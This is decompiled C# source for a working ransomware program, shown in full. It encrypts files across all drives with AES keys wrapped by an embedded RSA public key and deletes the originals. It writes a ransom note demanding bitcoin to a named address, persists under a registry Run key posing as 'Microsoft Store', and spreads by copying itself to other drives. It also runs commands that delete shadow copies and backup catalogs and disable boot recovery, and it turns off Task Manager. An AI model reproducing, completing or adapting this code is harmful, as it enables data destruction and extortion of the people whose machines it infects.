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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAD/2Q==";

	public static string appMutexStartup = "1qn5cmjkju03h49ml6";

	private static string droppedMessageTextbox = "read_it.txt";

	private static bool checkAdminPrivilage = false;

	private static bool checkdeleteShadowCopies = false;

	private static bool checkdisableRecoveryMode = false;

	private static bool checkdeleteBackupCatalog = false;

	private static bool disableTaskManager = false;

	public static string appMutexStartup2 = "1Cee1QKq46myiLV";

	public static string appMutex2 = appMutexStartup2 + appMutexRun2;

	public static string staticSplit = "bc";

	public static string appMutex = staticSplit + appMutexStartup + appMutexRun;

	public static readonly Regex appMutexRegex = new Regex("(?:[13]{1}[a-km-zA-HJ-NP-Z1-9]{26,33}|bc1[a-z0-9]{39,59})");

	private static List<string> messages = new List<string> { "Yes, you are right. FILE IN THIS DEVICE HAS ENCRYPTED!", "", "SEND 1BTC TO 1QJvUZmf4BaqYDNFg9DqHy9NexSkaYPQD4", "", "YOU must be ready to pay Decryption Tools and confirm your payment to email poop69news@gmail.com", "", "" };

	private static string[] validExtensions = new string[1] { ".jar" };

	private static Random random = new Random();

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(uint action, uint uParam, string vParam, uint winIni);

	private static void Main(string[] args)
	{
		if (isOver())
		{
			new Thread((ThreadStart)delegate
			{
				Run();
			}).Start();
			return;
		}
		if (AlreadyRunning())
		{
			Environment.Exit(1);
		}
		if (checkSleep)
		{
			sleepOutOfTempFolder();
		}
		if (checkAdminPrivilage)
		{
			copyResistForAdmin(processName);
		}
		else if (checkCopyRoaming)
		{
			copyRoaming(processName);
		}
		if (checkStartupFolder)
		{
			registryStartup();
		}
		if (checkAdminPrivilage)
		{
			if (checkdeleteShadowCopies)
			{
				deleteShadowCopies();
			}
			if (checkdisableRecoveryMode)
			{
				disableRecoveryMode();
			}
			if (checkdeleteBackupCatalog)
			{
				deleteBackupCatalog();
			}
			if (disableTaskManager)
			{
				DisableTaskManager();
			}
		}
		lookForDirectories();
		if (checkSpread)
		{
			spreadIt(spreadName);
		}
		addAndOpenNote();
		SetWallpaper(base64Image);
		new Thread((ThreadStart)delegate
		{
			Run();
		}).Start();
	}

	public static void Run()
	{
		Application.Run((Form)(object)new driveNotification.NotificationForm());
	}

	private static void sleepOutOfTempFolder()
	{
		string directoryName = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		if (directoryName != folderPath)
		{
			Thread.Sleep(sleepTextbox * 1000);
		}
	}

	private static bool AlreadyRunning()
	{
		Process[] processes = Process.GetProcesses();
		Process currentProcess = Process.GetCurrentProcess();
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.Modules[0].FileName == Assembly.GetExecutingAssembly().Location && currentProcess.Id != process.Id)
				{
					return true;
				}
			}
			catch (Exception)
			{
			}
		}
		return false;
	}

	public static string RandomString(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < length; i++)
		{
			char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
			stringBuilder.Append(value);
		}
		return stringBuilder.ToString();
	}

	public static string RandomStringForExtension(int length)
	{
		if (encryptedFileExtension == "")
		{
			StringBuilder stringBuilder = new StringBuilder();
			for (int i = 0; i < length; i++)
			{
				char value = "abcdefghijklmnopqrstuvwxyz0123456789"[random.Next(0, "abcdefghijklmnopqrstuvwxyz0123456789".Length)];
				stringBuilder.Append(value);
			}
			return stringBuilder.ToString();
		}
		return encryptedFileExtension;
	}

	public static string Base64EncodeString(string plainText)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(plainText);
		return Convert.ToBase64String(bytes);
	}

	private static void encryptDirectory(string location)
	{
		try
		{
			string[] files = Directory.GetFiles(location);
			bool flag = true;
			for (int i = 0; i < files.Length; i++)
			{
				try
				{
					string extension = Path.GetExtension(files[i]);
					string fileName = Path.GetFileName(files[i]);
					if (!Array.Exists(validExtensions, (string E) => E == extension.ToLower()) || !(fileName != droppedMessageTextbox))
					{
						continue;
					}
					FileInfo fileInfo = new FileInfo(files[i]);
					fileInfo.Attributes = FileAttributes.Normal;
					string text = CreatePassword(40);
					if (fileInfo.Length < 1368709120)
					{
						string keyRSA = RSA_Encrypt(text, rsaKey());
						if (checkDirContains(files[i]))
						{
							AES_Encrypt(files[i], text, keyRSA);
						}
					}
					else
					{
						AES_Encrypt_Large(files[i], text, fileInfo.Length);
					}
					if (flag)
					{
						flag = false;
						string path = location + "/" + droppedMessageTextbox;
						string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonDesktopDirectory);
						if (!File.Exists(path) && location != folderPath)
						{
							File.WriteAllLines(path, messages);
						}
					}
				}
				catch (Exception)
				{
				}
			}
			string[] directories = Directory.GetDirectories(location);
			for (int j = 0; j < directories.Length; j++)
			{
				encryptDirectory(directories[j]);
			}
		}
		catch (Exception)
		{
		}
	}

	private static bool checkDirContains(string directory)
	{
		directory = directory.ToLower();
		string[] array = new string[2] { "appdata\\local", "appdata\\locallow" };
		string[] array2 = array;
		foreach (string value in array2)
		{
			if (directory.Contains(value))
			{
				return false;
			}
		}
		return true;
	}

	public static string rsaKey()
	{
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine("<?xml version=\"1.0\" encoding=\"utf-16\"?>");
		stringBuilder.AppendLine("<RSAParameters xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:xsd=\"http://www.w3.org/2001/XMLSchema\">");
		stringBuilder.AppendLine("  <Exponent>AQAB</Exponent>");
		stringBuilder.AppendLine("  <Modulus>z7rZuI4ggK57M5p5b+MQguOXnKrLy0z8+bsKykZpxXT6nTd9H7X8J5jbBoLyZi/e7hBGNrxS0KroTLm99ZD7c40zkQNgj4epb3lcJrxPuqkPb9K5j911jCbn+i68wSkfJuwbQWeHXnFsjRsIhTQik5E2QdqloSQqMwA9Ji1cnrBpytaiaPWjL7L5/o+VIPNImgyOHgMzVGz1elX1XszejoGBUQuDI8nl2mQAQj2FQcTqqF7FBwfo7ZE1wqRfUIiwjbcBkX5KRV+eA+fftLOpUbF9k7jgKqAbVQuB1k2WSgxXvi9QUYdz4rVzhz8r6akps9TVSoASBul0nWhn5zxiyQ==</Modulus>");
		stringBuilder.AppendLine("</RSAParameters>");
		return stringBuilder.ToString();
	}

	public static string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void AES_Encrypt(string inputFile, string password, string keyRSA)
	{
		string path = inputFile + "." + RandomStringForExtension(4);
		byte[] array = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream fileStream = new FileStream(path, FileMode.Create);
		byte[] bytes = Encoding.UTF8.GetBytes(password);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		rijndaelManaged.Padding = PaddingMode.PKCS7;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, array, 1);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Mode = CipherMode.CFB;
		fileStream.Write(array, 0, array.Length);
		CryptoStream cryptoStream = new CryptoStream(fileStream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write);
		FileStream fileStream2 = new FileStream(inputFile, FileMode.Open);
		fileStream2.CopyTo(cryptoStream);
		fileStream2.Flush();
		fileStream2.Close();
		cryptoStream.Flush();
		cryptoStream.Close();
		fileStream.Close();
		using (FileStream stream = new FileStream(path, FileMode.Append, FileAccess.Write))
		{
			using StreamWriter streamWriter = new StreamWriter(stream);
			streamWriter.Write(keyRSA);
			streamWriter.Flush();
			streamWriter.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Small(string inputFile, string passwordBytes)
	{
		byte[] bytes = Encoding.ASCII.GetBytes(passwordBytes);
		byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
		FileStream stream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.KeySize = 256;
		rijndaelManaged.BlockSize = 128;
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(bytes, salt, 1000);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
		rijndaelManaged.Padding = PaddingMode.Zeros;
		rijndaelManaged.Mode = CipherMode.CBC;
		using (CryptoStream cryptoStream = new CryptoStream(stream, rijndaelManaged.CreateEncryptor(), CryptoStreamMode.Write))
		{
			FileStream fileStream = new FileStream(inputFile, FileMode.Open);
			fileStream.CopyTo(cryptoStream);
			fileStream.Flush();
			cryptoStream.Flush();
			fileStream.Close();
			cryptoStream.Close();
		}
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	private static void AES_Encrypt_Large(string inputFile, string password, long lenghtBytes)
	{
		GenerateRandomSalt();
		using FileStream fileStream = new FileStream(inputFile + "." + RandomStringForExtension(4), FileMode.Create, FileAccess.Write, FileShare.None);
		fileStream.SetLength(lenghtBytes);
		File.WriteAllText(inputFile, "?");
		File.Delete(inputFile);
	}

	public static byte[] GenerateRandomSalt()
	{
		byte[] array = new byte[32];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		for (int i = 0; i < 10; i++)
		{
			rNGCryptoServiceProvider.GetBytes(array);
		}
		return array;
	}

	public static string RSA_Encrypt(string textToEncrypt, string publicKeyString)
	{
		byte[] bytes = Encoding.UTF8.GetBytes(textToEncrypt);
		using RSACryptoServiceProvider rSACryptoServiceProvider = new RSACryptoServiceProvider(2048);
		try
		{
			rSACryptoServiceProvider.FromXmlString(publicKeyString.ToString());
			byte[] inArray = rSACryptoServiceProvider.Encrypt(bytes, fOAEP: true);
			return Convert.ToBase64String(inArray);
		}
		finally
		{
			rSACryptoServiceProvider.PersistKeyInCsp = false;
		}
	}

	private static void lookForDirectories()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			string text = "C:\\";
			if (driveInfo.ToString() == text)
			{
				string[] array = new string[9] { "Program Files", "Program Files (x86)", "Windows", "Intel", "PerfLogs", "Windows.old", "AMD", "NVIDIA", "ProgramData" };
				string[] directories = Directory.GetDirectories(text);
				for (int j = 0; j < directories.Length; j++)
				{
					DirectoryInfo directoryInfo = new DirectoryInfo(directories[j]);
					string dirName = directoryInfo.Name;
					if (!Array.Exists(array, (string E) => E == dirName))
					{
						encryptDirectory(directories[j]);
					}
				}
			}
			else
			{
				encryptDirectory(driveInfo.ToString());
			}
		}
	}

	private static void copyRoaming(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
			processStartInfo.WorkingDirectory = text;
			Process process = new Process();
			process.StartInfo = processStartInfo;
			if (process.Start())
			{
				Environment.Exit(1);
			}
			return;
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		ProcessStartInfo processStartInfo2 = new ProcessStartInfo(text2);
		processStartInfo2.WorkingDirectory = text;
		Process process2 = new Process();
		process2.StartInfo = processStartInfo2;
		if (process2.Start())
		{
			Environment.Exit(1);
		}
	}

	private static void copyResistForAdmin(string processName)
	{
		string friendlyName = AppDomain.CurrentDomain.FriendlyName;
		string location = Assembly.GetExecutingAssembly().Location;
		_ = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + friendlyName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\";
		string text2 = text + processName;
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text2);
		processStartInfo.UseShellExecute = true;
		processStartInfo.Verb = "runas";
		processStartInfo.WindowStyle = ProcessWindowStyle.Normal;
		processStartInfo.WorkingDirectory = text;
		ProcessStartInfo startInfo = processStartInfo;
		Process process = new Process();
		process.StartInfo = startInfo;
		if (!(friendlyName != processName) && !(location != text2))
		{
			return;
		}
		if (!File.Exists(text2))
		{
			File.Copy(friendlyName, text2);
			try
			{
				Process.Start(startInfo);
				Environment.Exit(1);
				return;
			}
			catch (Win32Exception ex)
			{
				if (ex.NativeErrorCode == 1223)
				{
					copyResistForAdmin(processName);
				}
				return;
			}
		}
		try
		{
			File.Delete(text2);
			Thread.Sleep(200);
			File.Copy(friendlyName, text2);
		}
		catch
		{
		}
		try
		{
			Process.Start(startInfo);
			Environment.Exit(1);
		}
		catch (Win32Exception ex2)
		{
			if (ex2.NativeErrorCode == 1223)
			{
				copyResistForAdmin(processName);
			}
		}
	}

	private static void addLinkToStartup()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
		string text = Process.GetCurrentProcess().ProcessName;
		using StreamWriter streamWriter = new StreamWriter(folderPath + "\\" + text + ".url");
		string location = Assembly.GetExecutingAssembly().Location;
		streamWriter.WriteLine("[InternetShortcut]");
		streamWriter.WriteLine("URL=file:///" + location);
		streamWriter.WriteLine("IconIndex=0");
		string text2 = location.Replace('\\', '/');
		streamWriter.WriteLine("IconFile=" + text2);
	}

	private static void addAndOpenNote()
	{
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		try
		{
			if (!File.Exists(text))
			{
				File.WriteAllLines(text, messages);
			}
			Thread.Sleep(500);
			Process.Start(text);
		}
		catch
		{
		}
	}

	private static bool isOver()
	{
		string location = Assembly.GetExecutingAssembly().Location;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + processName;
		string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\" + droppedMessageTextbox;
		if (location != text)
		{
			try
			{
				File.Delete(path);
			}
			catch
			{
			}
		}
		if (File.Exists(path) && location == text)
		{
			return true;
		}
		return false;
	}

	private static void registryStartup()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("Microsoft Store", Assembly.GetExecutingAssembly().Location);
		}
		catch
		{
		}
	}

	private static void spreadIt(string spreadName)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.ToString() != "C:\\" && !File.Exists(driveInfo.ToString() + spreadName))
			{
				try
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, driveInfo.ToString() + spreadName);
				}
				catch
				{
				}
			}
		}
	}

	private static void runCommand(string commands)
	{
		Process process = new Process();
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.FileName = "cmd.exe";
		processStartInfo.Arguments = "/C " + commands;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		process.StartInfo = processStartInfo;
		process.Start();
		process.WaitForExit();
	}

	private static void deleteShadowCopies()
	{
		runCommand("vssadmin delete shadows /all /quiet & wmic shadowcopy delete");
	}

	private static void disableRecoveryMode()
	{
		runCommand("bcdedit /set {default} bootstatuspolicy ignoreallfailures & bcdedit /set {default} recoveryenabled no");
	}

	private static void deleteBackupCatalog()
	{
		runCommand("wbadmin delete catalog -quiet");
	}

	public static void DisableTaskManager()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
			registryKey.SetValue("DisableTaskMgr", "1");
			registryKey.Close();
		}
		catch
		{
		}
	}

	public static void SetWallpaper(string base64)
	{
		if (base64 != "")
		{
			try
			{
				string text = Path.GetTempPath() + RandomString(9) + ".jpg";
				File.WriteAllBytes(text, Convert.FromBase64String(base64));
				SystemParametersInfo(20u, 0u, text, 3u);
			}
			catch
			{
			}
		}
	}
}
